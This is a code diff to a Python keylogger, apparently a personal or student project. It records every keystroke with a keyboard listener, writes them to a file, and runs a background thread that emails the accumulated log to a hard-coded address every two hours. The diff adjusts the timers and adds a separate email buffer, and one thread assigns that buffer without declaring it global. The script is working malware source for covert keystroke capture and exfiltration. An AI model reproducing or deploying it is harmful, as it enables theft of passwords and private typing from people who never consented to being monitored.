@@ -5,13 +5,14 @@ import smtplib, ssl, time, threading
 # statics
 FILE_NAME = "pulsaciones_grabadas.txt"
 SEND_EMAIL_TIME = 2*60*60
-MAX_INACTIVE_TIME = 2*60
+MIN_INACTIVE_TIME = 5*60
 TIMER_ACCURACY = 0.5
 
 # global variables
 finish = 0
-full_log = ''
 pressed = ''
+full_log = ''
+email_log = ''
 inactive_timer = 0
 email_timer = 0
 
@@ -20,6 +21,7 @@ def on_press(key):
 
     global pressed
     global full_log
+    global email_log
     global inactive_timer
     global finish
     inactive_timer = 0
@@ -34,24 +36,28 @@ def on_press(key):
             return False
         pressed = '{0}'.format(key)
         full_log += pressed
+        email_log = full_log
         print(pressed)
     except AttributeError:
         pressed = '{0}'.format(key)
         full_log += pressed
+        email_log = full_log
         print(pressed)
 
 # inactive counter process
-def inactive_counter_process():
+def inactive_scheduled():
     global inactive_timer
     global full_log
     global finish
     
+    
     while finish == 0:
         time.sleep(TIMER_ACCURACY)
         inactive_timer += TIMER_ACCURACY
-        if inactive_timer == MAX_INACTIVE_TIME:
+        if inactive_timer == MIN_INACTIVE_TIME:
             print(f"inactive since {inactive_timer} seconds ago")
             full_log += '\n'
+            email_log = full_log
             inactive_timer = 0
 
 
@@ -64,18 +70,18 @@ def out_put_file(text):
 
 # send email by scheduled time
 def send_email_scheduled():
-    global full_log
+    global email_log
     global finish
     global email_timer
 
     while finish == 0:
         time.sleep(TIMER_ACCURACY)
         email_timer += TIMER_ACCURACY
-        if email_timer == MAX_INACTIVE_TIME:
-            send_email("qwang036@uoc.edu",'keyLogger',full_log)
+        if email_timer == SEND_EMAIL_TIME:
+            send_email("qwang036@uoc.edu",'keyLogger',email_log)
             print('email sent')
             email_timer=0
-            full_log = ''
+            email_log = ''
 
 # send email 
 def send_email(to,subject,text):
@@ -95,7 +101,7 @@ def send_email(to,subject,text):
 
 # MAIN PROCESS
 keyListener = keyboard.Listener(on_press=on_press)
-inactiveProcess = threading.Thread(target=inactive_counter_process)
+inactiveProcess = threading.Thread(target=inactive_scheduled)
 emailProcess = threading.Thread(target=send_email_scheduled)
 
 keyListener.start()
